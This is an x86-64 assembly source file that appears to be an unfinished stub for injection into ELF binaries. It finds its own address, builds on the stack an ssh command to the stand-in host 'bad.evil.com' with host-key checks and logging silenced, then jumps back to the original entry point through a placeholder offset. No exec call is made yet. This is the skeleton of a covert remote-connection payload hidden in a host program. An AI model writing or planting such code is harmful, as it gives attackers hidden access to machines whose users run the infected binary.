.intel_syntax noprefix

#; When writing Entry, look at how __libc_start_main is called, and it's arguments
#; There are varied versions and arguments, but it can help us understand what needs to be where
#; when we call the real entry



#; registers to save and restore (or not use):
#;  rax
#;  rdx
#;  rsp (or fake contents)

PING:
	call short PONG
PONG:
	#; get rip
	pop rbx

	#; get base
	mov rbp, rsp
	
	#; save registers
	#; push rax
	#; push rdx

	#; set up strings
	#; ssh -o StrickHostKeyChecking=no bad.evil.com
	
	mov rdi, 0x000000006d6f632e	#; .com\0
	push rdi
	mov rdi, 0x6c6976652e646162	#; bad.evil
	push rdi
	lea rdi, [rsp]

	xor rcx, rcx			#; \0
	push rcx
	mov rsi, 0x6f6e3d676e696b63	#; cking=no
	push rsi
	mov rsi, 0x65684379654b7473	#; stKeyChe
	push rsi
	mov rsi, 0x6f48746369727453	#; StrictHo
	push rsi
	lea rsi, [rsp]
	
	mov r8, 0x00000000000006f2d	#; -o\0
	push r8
	lea r8, [rsp]

	mov r9, 0x0000524f5252453d	#; =ERROR\0
	push r9
	mov r9, 0x6c6576654c676f4c	#; LogLevel
	push r9
	lea r9, [rsp]

	mov r10, 0x000000006c6c756e	#; null\0
	push r10
	mov r10, 0x2f7665642f3d656c	#; le=/dev/
	push r10
	mov r10, 0x69467374736f486e	#; nHostsFi
	push r10
	mov r10, 0x776f6e4b72657355	#; UserKnow
	push r10
	lea r10, [rsp]

	#; setup env
	push rcx
	#; setup argv
	push rcx
	push rdi
	push rsi
	push r8
	push r10
	push r8
	push r9
	push r8
	mov rsi, [rbp + 0x8]
	push rsi
	#; setup argc
	mov rdi, 0x8
	push rdi
	

END:
	#; restore any stack changes

	#; get original entry ptr
	mov rcx, 0x4141414141414141
	add rbx, rcx
	
	#; restore registers
	#; pop rdx
	#; pop rax

	#; goto original
	#;int3
	jmp rbx

#; an example anotated start:
#;_start
#;  401040:       f3 0f 1e fa             endbr64 
#;  401044:       31 ed                   xor    %ebp,%ebp			== clean ebp
#;  401046:       49 89 d1                mov    %rdx,%r9			== rtld_fini
#;  401049:       5e                      pop    %rsi				== argc
#;  40104a:       48 89 e2                mov    %rsp,%rdx			== ubp_av
#;  40104d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp	== align stack
#;  401051:       50                      push   %rax				== someglobal
#;  401052:       54                      push   %rsp				== stackend
#;  401053:       49 c7 c0 d0 11 40 00    mov    $0x4011d0,%r8			== __libc_csu_fini
#;  40105a:       48 c7 c1 60 11 40 00    mov    $0x401160,%rcx			== __libc_csu_init
#;  401061:       48 c7 c7 26 11 40 00    mov    $0x401126,%rdi			== main
#;  401068:       ff 15 82 2f 00 00       callq  *0x2f82(%rip)
